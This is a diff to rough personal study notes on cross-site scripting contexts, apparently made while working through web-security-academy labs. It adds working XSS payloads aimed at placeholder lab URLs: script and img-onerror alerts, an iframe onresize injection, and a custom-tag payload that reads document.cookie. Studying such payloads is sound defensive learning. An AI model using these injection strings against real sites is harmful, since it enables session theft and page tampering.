@@ -3,11 +3,25 @@ cross site scripting contexts
 1. xss betwenn tags
 when xss is between tags we can directlya dd our paylaod as is would not require us to bypass anything as such
 this may include 
-I simple payload like alert to test the presence of xss
+I simple payload like alert to test the presence of xss      ---> eg <script>alert(1);</alert>
 IIwhen most of the tags are blocked we may be able to use bruteforce to find the trags and their attributes taht can be allowed 
-and then use those to perform xss attack
+and then use those to perform xss attack                    
+------> eg <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 III when all tags are blocaked exept for custom tags then we may need to create our own payload   -----> most importrant
+eg  ------> 
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+IV reflected xss with SVG allowed
 
+
+
+NOTE::::: When the XSS context is text between HTML tags, you need to introduce 
+some new HTML tags designed to trigger execution of JavaScript.
+
+Some useful ways of executing JavaScript are:
+<script>alert(document.domain)</script>
+<img src=1 onerror=alert(1)>
 
 2. 
 
